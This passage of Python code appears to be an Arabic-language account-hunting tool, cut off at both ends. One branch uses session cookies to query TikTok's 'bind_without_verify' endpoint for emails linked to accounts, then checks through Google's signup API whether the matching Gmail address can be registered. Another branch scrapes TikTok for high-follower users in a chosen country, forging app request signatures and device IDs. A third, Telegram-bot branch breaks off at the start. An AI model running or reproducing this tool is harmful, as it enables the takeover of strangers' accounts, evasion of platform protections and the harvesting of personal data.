	    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	    params=params,
	    headers=headers,
	    data=data,
	).text
	            if 'steps/signup/birthdaygender' in response:
	                pass
	    except:''
	    try:
	            birthday = randrange(1980,2010),randrange(1,12),randrange(1,28)
	            headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	    'origin': 'https://accounts.google.com',
	    'referer': 'https://accounts.google.com/',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	    'x-same-domain': '1',
	}
	            params = {
	    'rpcids': 'eOY7Bb',
	    'source-path': '/lifecycle/steps/signup/birthdaygender',
	    'hl': 'en-US',
	    'TL': tl,
	    'rt': 'c',
	}
	            data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3Cf7Nqs-sCAAZfiOnPf4iN_32KOpLfQKL0ADQBEArZ1IBDTUyai2FYax3ViMI2wqBpWShhe-OPRhpMjnm9s14Yu65MknXEBWcyTyF3Jx0pzQAAAeGdAAAAC6cBB7EATZAxrowFF7vQ68oKqx7_sdcR_u8t8CJys-8G4opCIVySwUYaUnm-BovA8aThYLISPNMc8Pl3_B0GnkQJ_W4SIed6l6EcM7QLJ8AXVNAaVgbhsnD7q4lyQnlvR14HRW10oP85EU_bwG1E4QJH1V0KnVS4mIeoqB7zHOuxMuGifv6MB3GghUGTewh0tMN1jaf8yvX804tntlrlxm3OZgCZ2UxgDjUVOKFMv1Y3Txr16jJEJ56-T7qrPCtt6H1kmUvCIl_RDZzbt_sj5OLnbX1UvVA-VgG8-X9AJdvGhCKVhkf3iSkjy6_ZKsZSbsOsMjrm7ggnLdMStIf4AzbJIyMC7q4JMCaDaW_UI9SgquR8mHMpHGRmP7zY-WE47l7uRSpkI6oV93XJZ1zskJsxaDz7sDYHpzEL1RGPnkZU45XkIkwuc1ptU_AiM6SQyoZK7wFnhYxYfDQjSwaC7lOfngr6F2e4pDWkiC96QY4xLr6m2oUoDbyKR3ykccKEECEakFKzS-wSxIt9hK6nw-a9PEpVzhf6uIywZofNCs0KJOhhtv_ReG24DOC6NHX-FweCOkiYtT2sISrm6H8Wr4E89oU_mMWtpnXmhs8PB28SXw42-EdhRPsdcQkgKycOVT_IXwCc4Td9-t7715HP-L2XLk5i05aUrk-sHPPEz8SyL3odOb1SkwQ69bRQHfbPZr858iTDD0UaYWE_Jmb4wlGxYOSsvQ3EIljWDtj69cq3slKqMQu0ZC9bdqEh0p_T9zvsVwFiZThf19JL8PtqlXH5bgoEnPqdSfYbnJviQdUTAhuBPE-O8wgmdwl22wqkndacytncjwGR9cuXqAXUk_PbS-0fJGxIwI6-b7bhD7tS2DUAJk708UK5zFDLyqN6hFtj8AAjNM-XGIEqgTavCRhPnVT0u0l7p3iwtwKmRyAn42m3SwWhOQ6LDv-K2DyLl2OKfFu9Y-fPBh-2K2hIn2tKoGMgVbBR8AsVsYL7L6Bh5JIW7LCHaXNk3oDyHDx5QFaPtMmnIxcfFG90YSEPIgWV2nb67zDDacvvCkiPEQMXHJUcz1tuivaAgCTgW68wNYkUt89KJDhJTSWY2jcPsDIyCnS-SGESyR7mvbkvC3Robo0zVQm6q3Z73si9uqJiPmUGgBLycxUq2A_L3B-Hz35vBm5Oc5Hbe8hJToB03ilQzLa8Kld5BY8_kmmh6kfrOvi07uwfusHv3mKfijE2vaK3v2O2He41hCaOv3ExSfdPKb2V5nPPTw8ryyC5ZwlM_DLCU_k5xONsh4uplpRmydmJcit4aj5Ig0qLVF9MxIWU5xoDlvhKL9jHh-HVgIe-CPp4RMM5BfTxDgtESiF97RWjwrNeKn6Fc4311AdCrfZMcZ0F2JnQsfKAz4H-hoWbrOEVBkPcBt5umJ_iaCm0cQ2XTQMjzAtfWbRe6EGSxbkK-DXBl4EQM-6cnH1139MIHLzNou_Tltbl2HaomCS044CwhRNpe95KuYhM4Fz0Z_8rRjqy48tS_L4kQMX1CtxjBNfd4eUoaAIwAcz3LaL5BwL0DAYcV3xruTTuy6X8zFHe8fAIB9pJ_Pw0YJm3Ye28_tTg5xk0R4EU7_IPIHk6RrtSsG0Rfst3Qi5NRfWFg5h9LlmlHO_EUhdw1wbCICTqbS2A94aIBSCQzn7RmqOTTSIXwgFwnSBRKvoo0v9tKQ2rnMZsXRhzQgxwfmYOq29EUbuHmmWQjpRhfzX1Z6-5gXRPr4-PjrInsTiAi36xDyc8a1yTAhKMwnvf3GNqcK8lqx80VCASvcpYxGIAFl4QghroZbIJXlhccCWVF_xrzsw83QUdoZ5ExWi5f_cLvEXeZssdtan1orOaPJuWXT_0ryzpS9fOGtT68pL4HMAPLPpfwhiZ-wtZQU0oVy6T2L6oP1SIHQDU_QDaMR0MkStXNDj69r5cTDdYZiIbFkvWYeL1afTEljx1i2n2KKnDmpJfx2HeGCSZBMKZey24z_LDLA7MyJ2VBo4Zvmm23dwhWHOly56w9ul4sWzpHqgsqmKynRoaq9SXKrrmbR3f2GKBHSvy3Jm0Ln52zwIQfFSXpOjGXq5pkOXlvQc6MPuV3zADVmcUZs6ywI-ER3PkAaA-f-zG-ke_6jvOzGp6WF8UxnIk5tq3tus_R5pUjVQFjk6qZtWOP8VZd1TeJ54Oo_ywj8YAYCphkDtFYRMZSubmnI-F9LLlAfOiDwQ7r-iNvp8psduy9xrWdIpE_l23Y_qYJPHwvtopL3lB7juqEiFkhUts7NEugyWY-m6-9oEgsOY0lM4746V-XUxSeS7UkZkQZZM19g7GkWjJ61D98i0m2u_UYLnyDFQEaIxVhFcmS1Zq7OMsKm_gYpMt4LuD1F3N__Vj05QNyI59QNQADODveiHpfVva9Cd2AzBm9AKGwU4xDS_FyX3XRsRbfQFtqNzPf1LAERHlnHFn%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(birthday[0],birthday[1],birthday[2],at)
	            response = s.post(
	    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	    params=params,
	    headers=headers,
	    data=data,
	).text
	            if 'steps/signup/username' in response:
	                pass
	    except:''
	    try:
	            headers = {
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
	    'origin': 'https://accounts.google.com',
	    'referer': 'https://accounts.google.com/',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
	    'x-goog-ext-391502476-jspb': '["'+s1+'"]',
	    'x-same-domain': '1',
	}
	            params = {
	    'rpcids': 'NHJMOd',
	    'source-path': '/lifecycle/steps/signup/username',
	    'hl': 'en-US',
	    'TL': tl,
	    'rt': 'c',
	}
	            data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C152855%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)
	            response = s.post(
	    'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
	    params=params,
	    headers=headers,
	    data=data,
	).text
	            email=email+'@gmail.com'
	            if 'steps/signup/password' in response:
	            	yas+=1
	            	os.system('clear')
	            	sys.stdout.write(f'''\r
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
	 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
	 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
	 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
	 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	''');sys.stdout.flush()
	            	info(email)
	            else:
	            	os.system('clear')
	            	nod+=1
	            	sys.stdout.write(f'''\r
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
	 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
	 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
	 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
	 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	''');sys.stdout.flush()
	            print(response)
	    except:print('gg')
	
	def chzm(email):
		email=email+'@gmail.com'
		global ya,no,yas,nod
		def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
		       x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
		       data=payload
		       if not unix: unix = int(time.time())
		       return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}		
		cookies={"sessionid": random.choice(nameee)}
		params={
		
	    'aid': '1233',
	   'app_language': 'ar',
	    'device_id': str(random.randint(1, 10**19)),
	    'device_platform': 'android',
	    'iid': str(random.randint(1, 10**19)),
	    'version_name': str(random.randint(1, 10**19)),
	    'use_store_region_cookie': '1',
	    'version_code': str(random.randint(1, 10**19)),
	}
		he = {
	        'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})',
	        }
	
		data=f'email={email}'
		x_log = x_log = sign(urlencode(params), data,  str(uuid.uuid4()) + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233)
		he.update(x_log)
		res=requests.post(f'https://{random.choice(["inapp.tiktokv.com","api2.musical.ly","api16-normal-c-alisg.tiktokv.com","api2-19-h2.musical.ly"])}/passport/email/bind_without_verify/',data=data,headers=he,params=params,cookies=cookies).text
		print(res)
		if "فشل في الربط، تم ربط صندوق البريد بالحساب الآخر"in res:
			os.system('clear')
			ya+=1
			sys.stdout.write(f'''\r
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
	 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
	 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
	 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
	 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	''');sys.stdout.flush()
			check_gmail(email)
		else:
			os.system('clear')
			no+=1
			sys.stdout.write(f'''\r
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	 < \033[1;32mGood Gm\033[0m  - \033[1;36m{yas}\033[0m  > 
	 < \033[1;34mGood Em\033[0m  - \033[1;33m{ya}\033[0m   >
	 < \033[1;33mBad Em \033[0m  - \033[1;31m{no}\033[0m   >
	 < \033[1;31mBad Gm \033[0m  - \033[1;35m{nod}\033[0m  >
	 < \033[1;36mCh mail\033[0m  - \033[1;32m{email}\033[0m>
	\033[1;35m - — — — — — — — — — — — — —\033[0m
	''');sys.stdout.flush()             
	  
	def main():
	    try:
		    with open(fileuser, 'r') as f:
		        users = [line.strip() for line in f if line.strip()]
	    except:
	    	print('غير موجود')
	    	exit()
	    with ThreadPoolExecutor(max_workers=20) as executor:
	        executor.map(chzm, users)
	if __name__ == "__main__":
	    main()	   
elif ch==2:	
	import asyncio, aiohttp, os, urllib.parse, re, random, binascii, uuid, time
	from MedoSigner import Argus, Gorgon, Ladon, md5		
	print('ملاحضه : سوف ينحفض ملف السته في الملفات واسم الملف list.txt')
	print('')
	COUNTRIES = [
	    ("iraq", "العراق", "IQ", "🇮🇶"),
            ("usa", "الولايات المتحدة", "US", "🇺🇸"),
	    ("saudiarabia", "المملكة العربية السعودية", "SA", "🇸🇦"),
	    ("egypt", "مصر", "EG", "🇪🇬"),
	    ("uae", "الإمارات", "AE", "🇦🇪"),
	    ("kuwait", "الكويت", "KW", "🇰🇼"),
	    ("bahrain", "البحرين", "BH", "🇧🇭"),
	    ("oman", "عمان", "OM", "🇴🇲"),
	    ("qatar", "قطر", "QA", "🇶🇦"),
	    ("jordan", "الأردن", "JO", "🇯🇴"),
	    ("lebanon", "لبنان", "LB", "🇱🇧"),
	    ("syria", "سوريا", "SY", "🇸🇾"),
	    ("palestine", "فلسطين", "PS", "🇵🇸"),
	    ("sudan", "السودان", "SD", "🇸🇩"),
	    ("libya", "ليبيا", "LY", "🇱🇾"),
	    ("morocco", "المغرب", "MA", "🇲🇦"),
	    ("algeria", "الجزائر", "DZ", "🇩🇿"),
	    ("tunisia", "تونس", "TN", "🇹🇳"),
	    ("mauritania", "موريتانيا", "MR", "🇲🇷"),
	    ("somalia", "الصومال", "SO", "🇸🇴"),
	    ("djibouti", "جيبوتي", "DJ", "🇩🇯"),
	    ("comoros", "جزر القمر", "KM", "🇰🇲"),
	    ("yemen", "اليمن", "YE", "🇾🇪"),
	]
	print('قناتي\n https://t.me/+usE6tGQ4aUgwZWI0')
	# ============================
	# اختيار الدولة من القائمة
	def select_country_from_list():
	    print("اختر الدولة من القائمة التالية بكتابة رقمها ثم اضغط Enter:\n")
	    for idx, (en, ar, iso, flag) in enumerate(COUNTRIES, start=1):
	        print(f"{idx} - {en} - {ar} {flag}")
	    while True:
	        try:
	            choice = input(f"\nاختار رقم الدوله من 1 الى {len(COUNTRIES)} : ").strip()
	            num = int(choice)
	            if 1 <= num <= len(COUNTRIES):
	                en, ar, iso, flag = COUNTRIES[num - 1]
	                print(f"\nتم اختيار: {num} - {en} - {ar} {flag} (رمز البلد: {iso})\n")
	                return en, ar, iso, flag
	            else:
	                print(f"الرجاء اختيار رقم بين 1 و {len(COUNTRIES)}.")
	        except ValueError:
	            print("الرجاء إدخال رقم صحيح (أرقام فقط).")
	
	# اختيار الدولة
	SELECTED_COUNTRY_EN, SELECTED_COUNTRY_AR, SELECTED_COUNTRY_ISO, SELECTED_COUNTRY_FLAG = select_country_from_list()
	
	a = 0
	users = set()
	user_queue = asyncio.Queue()
	lock = asyncio.Lock()
	def Vals():
	    return {
	        "manifest_version_code": "330802",
	        "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
	        "app_language": "ar",
	        "app_type": "normal",
	        "iid": str(random.randint(1, 10 ** 19)),
	        "channel": "googleplay",
	        "device_type": "RMX3511",
	        "language": "ar",
	        "host_abi": "arm64-v8a",
	        "locale": "ar",
	        "resolution": "1080*2236",
	        "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
	        "update_version_code": "330802",
	        "ac2": "lte",
	        "cdid": str(uuid.uuid4()),
	        "sys_region": SELECTED_COUNTRY_ISO,
	        "os_api": "33",
	        "timezone_name": "Asia/Baghdad",
	        "dpi": "360",
	        "carrier_region": SELECTED_COUNTRY_ISO,
	        "ac": "4g",
	        "device_id": str(random.randint(1, 10 ** 19)),
	        "os_version": "13",
	        "timezone_offset": "10800",
	        "version_code": "330802",
	        "app_name": "musically_go",
	        "ab_version": "33.8.2",
	        "version_name": "33.8.2",
	        "device_brand": "realme",
	        "op_region": SELECTED_COUNTRY_ISO,
	        "ssmix": "a",
	        "device_platform": "android",
	        "build_number": "33.8.2",
	        "region": SELECTED_COUNTRY_ISO,
	        "aid": "1340",
	        "ts": str(round(random.uniform(1.2, 1.6) * 100000000) * -1)
	    }, {
	        'User-Agent': 'com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)'
	    }
	
	def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None,
	         aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n",
	         sdk_version: int = 2, platform: int = 19, unix: int = None):
	    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload is not None else None
	    if not unix:
	        unix = int(time.time())
	    return Gorgon(params, unix, payload, cookie).get_value() | {
	        "x-ladon": Ladon.encrypt(unix, license_id, aid),
	        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid,
	                                  license_id=license_id, sec_device_id=sec_device_id,
	                                  sdk_version=sdk_version_str, sdk_version_int=sdk_version)
	    }
	def V12():
	    kew = "ابتثجحخدذرزسشصضطظعغفقكلمنهوي"
	    k = ''.join((random.choice(kew) for i in range(random.randrange(2, 9))))
	    return k

	async def info(session, username):
	    global users
	    headers = {
	        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6"
	    }
	    try:
	        async with session.get(f'https://www.tiktok.com/@{username}', headers=headers) as resp:
	            tikinfo = await resp.text()
	        info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
	        try:
	            user_id = str(info.split('id":"')[1]).split('",')[0]
	            following = str(info.split('followingCount":')[1]).split(',"')[0]
	            country = str(info.split('region":"')[1]).split('",')[0]
	            async with lock:
	                if country == SELECTED_COUNTRY_ISO and username not in users and int(following) >= 5000:
	                    users.add(username)
	                    await user_queue.put(user_id)
	        except:
	            pass
	    except:
	        pass

	async def get_following(session, user_id):
	    global users, a
	    token = None
	    while True:
	        try:
	            p, h = Vals()
	            signed = sign(params=urllib.parse.urlencode(p), payload="", cookie="")
	            h.update({
	                'x-ss-req-ticket': signed['x-ss-req-ticket'],
	                'x-argus': signed["x-argus"],
	                'x-gorgon': signed["x-gorgon"],
	                'x-khronos': signed["x-khronos"],
	                'x-ladon': signed["x-ladon"]
	            })
	            base_url = f'https://api16-normal-c-alisg.tiktokv.com/lite/v2/relation/following/list/?user_id={user_id}&count=50&source_type=1&request_tag_from=h5&{urllib.parse.urlencode(p)}'
	            if token:
	                base_url += f"&page_token={urllib.parse.quote(token)}"
	            async with session.get(base_url, headers=h) as response:
	                data = await response.json()
	            for user in data.get("followings", []):
	                reg = user.get("region")
	                fol = user.get("follower_count")
	                username = user.get("unique_id")
	                async with lock:
	                    if username and reg == SELECTED_COUNTRY_ISO:
	                        if int(fol) > 6500 and username not in users:
	                            a += 1
	                            users.add(username)
	                            print(f'{a} - {username} | {fol} | {reg}')
	                            with open("list.txt", "a", encoding="utf-8") as f:
	                                f.write(username + "\n")
	                        else:
                                    print("low followrs!!")
	            if not data.get("has_more"):
	                break
	            token = data.get("next_page_token")
	            if not token:
	                break
	        except Exception:
	            break

	async def search(session):
	    while True:
	        try:
	            username = V12()
	            url = "https://search16-normal-c-alisg.tiktokv.com/aweme/v1/search/user/sug/?iid=" + str(
	                random.randint(1, 10 ** 19)) + "&device_id=" + str(random.randint(1, 10 ** 19)) + "&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid=" + str(
	                binascii.hexlify(os.urandom(8)).decode()) + "&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket=" + str(
	                round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632" + "&current_region=" + SELECTED_COUNTRY_ISO + "&app_type=normal&sys_region=" + SELECTED_COUNTRY_ISO + "&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=" + SELECTED_COUNTRY_ISO + "&app_language=ar&carrier_region=" + SELECTED_COUNTRY_ISO + "&ac2=wifi&uoo=0&op_region=" + SELECTED_COUNTRY_ISO + "&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=" + SELECTED_COUNTRY_ISO + "&content_language=gu%2C&ts=" + str(
	                round(random.uniform(1.2, 1.6) * 100000000) * -1) + "&cdid=" + str(uuid.uuid4()) + ""
	            payload = {
	                'keyword': username,
	                'count': "100",
	                'source': "tt_ffp_add_friends",
	                'mention_type': "0"}
	            headers = {'Host': 'search16-normal-c-alisg.tiktokv.com',
	                       'User-Agent': "com.zhiliaoapp.musically/2023105030 (Linux; U; Android 13; ar_IQ; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:2fdb62f9 2023-09-06 QuicVersion:bb24d47c 2023-07-19)"}
	            headers.update(sign(url.split('?')[1], payload=urllib.parse.urlencode(payload)))
	            async with session.post(url, data=payload, headers=headers) as response:
	                data = await response.json()
	            ids = [
	                item["extra_info"].get("sug_uniq_id")
	                for item in data.get("sug_list", [])
	                if "extra_info" in item
	                   and "sug_uniq_id" in item["extra_info"]
	                   and re.fullmatch(r"[A-Za-z0-9_]+", item["extra_info"]["sug_uniq_id"])
	            ]
	            for user in ids:
	                await info(session, user)
	        except Exception as e:
	            print('Error in Search:', e)

	async def worker(session):
	    while True:
	        try:
	            user_id = await user_queue.get()
	            await get_following(session, user_id)
	            user_queue.task_done()
	        except Exception:
	            pass

	async def main():
	    async with aiohttp.ClientSession() as session:
	        workers = [asyncio.create_task(worker(session)) for _ in range(30)]
	        searches = [asyncio.create_task(search(session)) for _ in range(20)]
	        await asyncio.gather(*workers, *searches)

	if __name__ == '__main__':
	    try:
	        asyncio.run(main())
	    except KeyboardInterrupt:
	        print("\nتم الإيقاف بواسطة المستخدم. مع السلامة.")
elif ch==3:
	import requests, random, time, uuid, string, hashlib, base64, json, ms4, re, fake_useragent, os
	from concurrent.futures import ThreadPoolExecutor
	import threading, telebot
	lock = threading.Lock()
	BOT_TOKEN = input('	Token Bot Tele : ')
	bot = telebot.TeleBot(BOT_TOKEN)
	sessions = {}
	user_agent_generator = fake_useragent.FakeUserAgent()
	thread_local = threading.local()
	
	def random_num(length=10):
	    return ''.join(random.choice(string.digits) for _ in range(length))
	
	def random_hex(length=32):
	    return ''.join(random.choice('0123456789abcdef') for _ in range(length))
	
	def random_uuid():
	    return str(uuid.uuid4())
	
	def random_user_agent():
	    brands = ["Infinix", "Samsung", "Xiaomi", "Huawei", "Realme", "Oppo", "Vivo", "Tecno"]
	    models = ["X692", "A52", "M21", "Note9", "Y20", "C25", "F17", "P30"]
	   
